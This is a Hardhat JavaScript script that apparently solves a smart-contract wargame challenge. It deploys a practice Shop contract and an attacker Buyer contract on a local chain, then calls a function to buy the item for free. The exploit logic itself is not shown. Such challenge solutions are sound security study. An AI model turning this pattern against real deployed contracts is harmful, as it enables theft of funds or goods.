/*
Сan you get the item from the shop for less than the price asked?

  Things that might help:
    Shop expects to be used from a Buyer
    Understanding restrictions of view functions
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player, deployer] = await ethers.getSigners();

  // Deploy Shop
  const Shop = await hre.ethers.getContractFactory("Shop");
  this.shop = await Shop.connect(deployer).deploy();
  await this.shop.deployed();

  // Deploy the Buyer contract
  const Buyer = await hre.ethers.getContractFactory("BuyerContract");
  this.buyer = await Buyer.connect(player).deploy(this.shop.address);
  await this.buyer.deployed();


  console.log(
    `
    Shop address ${await this.shop.address} \n
    Buyer address ${await this.buyer.address} \n
    Price in Shop ${await this.shop.price()} \n
    Price in Buyer ${await this.buyer.price()}
    `
  );


  console.log("\n\n Performing attack ... \n\n");

  // Buying the item for free
  console.log("Buying the item for free ...");

  const buyItemTX = await this.buyer.connect(player).buyItemForFree();
  
  // Await for the buyItemTX to be mined
  console.log("Waiting while we buy the item for free :) ");
  await buyItemTX.wait();

  console.log(
    `
    Price in Shop after the attack ${await this.shop.price()} \n
    `
  );
  
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});